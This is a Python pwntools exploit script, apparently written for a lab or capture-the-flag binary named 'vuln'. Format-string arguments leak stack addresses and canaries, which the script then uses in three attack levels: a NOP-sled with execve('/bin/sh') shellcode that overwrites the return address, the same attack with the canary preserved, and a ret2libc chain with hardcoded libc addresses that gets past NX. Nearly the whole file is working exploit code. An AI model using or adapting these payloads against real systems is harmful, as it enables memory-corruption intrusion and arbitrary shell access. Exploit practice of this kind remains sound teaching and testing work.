import os
import subprocess
from pwn import *

# Global variables
payloadPath = "./payload"
sizeOfBuf = 1337 + 7
offset = 1376

def stringToByteLittleEndian(val):
    val = str(hex(int(val, 16) - offset ))[2:]
    result = ""
    for i in range(0, len(val), 2):
        if(val[i:i+2] == "00"):
            result = "\\x" + "01" + result
        else:
            result = "\\x" + val[i:i+2] + result
    return result.encode().decode('unicode_escape').encode("raw_unicode_escape")

def canaryToByteLittleEndian(val):
    result = ""
    for i in range(0, len(val), 2):
        result = "\\x" + val[i:i+2] + result
    return result.encode().decode('unicode_escape').encode("raw_unicode_escape")

def getReturnAddress(ra):
    bytera = stringToByteLittleEndian(ra)
    return bytera

def insertShellCode(shellcode, shellsize, buffersize):
    nopInstruc = b"\x90"
    middle = int((buffersize - shellsize) / 2)
    payload = nopInstruc * middle
    payload += shellcode
    payload += nopInstruc * (buffersize-middle-shellsize-8)
    return payload

# Function to generate simple payload with no protection + ASLR
def generatePayloadLevel1(ra):
    shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
    payload = insertShellCode(shellcode, len(shellcode), sizeOfBuf + 8)
    payload += b"\x90"*8
    payload += ra
    return payload+b"\n"

# Function to generate simple payload with canary protection + ASLR
def generatePayloadLevel2(ra, canary):
    shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
    payload = insertShellCode(shellcode, len(shellcode), sizeOfBuf + 8)
    payload += b"\x90"*8
    payload += canary
    payload += b"\x90"*8
    payload += ra
    return payload+b"\n"

# Function to generate simple payload with NX protection + canary
def generatePayloadLevel3(canary):
    # system = 0x7ffff7e18290
    # exit = 0x7ffff7e0ca40
    # libc = 0x7ffff7dc6000
    # binsh offset = 1b45bd
    # binsh addr = 0x7FFFF7F7A5BD
    payload = b"\x90"*(sizeOfBuf + 8)
    payload += canary
    payload += b"\x90"*8
    payload += canaryToByteLittleEndian("00007ffff7e18290")
    payload += canaryToByteLittleEndian("00007ffff7e0ca40")
    payload += canaryToByteLittleEndian("00007FFFF7F7A5BD")
    return payload+b"\n"

def writeToFile(payloadPath,payload):
    if(payload == None):
        print("Error payload is None")
        return
    with open (payloadPath, 'wb') as f:
        f.write(payload)
    
def executeProgram1():
    io = process(['./vuln' , "%176$p\n"],env=None)
    value = io.read()
    value = value.decode().strip("\n")[2:]
    ra = getReturnAddress(value)
    payload = generatePayloadLevel1(ra)
    io.sendline(payload)
    # data = io.read()
    # print(data.decode())

def executeProgram2():
    io = process(['./vuln' , "%177$p%178$p\n"],env=None)
    value = io.read()
    print(value)
    value = value.decode().split("0x")
    canary = canaryToByteLittleEndian(value[1])
    ra = getReturnAddress(value[2].strip("\n"))
    payload = generatePayloadLevel2(ra,canary)
    io.sendline(payload)
    # data = io.read()
    # print(data.decode())
    
def executeProgram3():
    io = process(['./vuln' , "%177$p\n"],env=None)
    value = io.read()
    print(value)
    canary = canaryToByteLittleEndian(value.decode().strip("\n")[2:])
    print(canary)
    payload = generatePayloadLevel3(canary)
    print(payload)
    sleep(20)
    io.sendline(payload)
    data = io.read()
    print(data.decode())

def main():
    #executeProgram1()
    #executeProgram2()
    executeProgram3()


if __name__ == '__main__':
    main()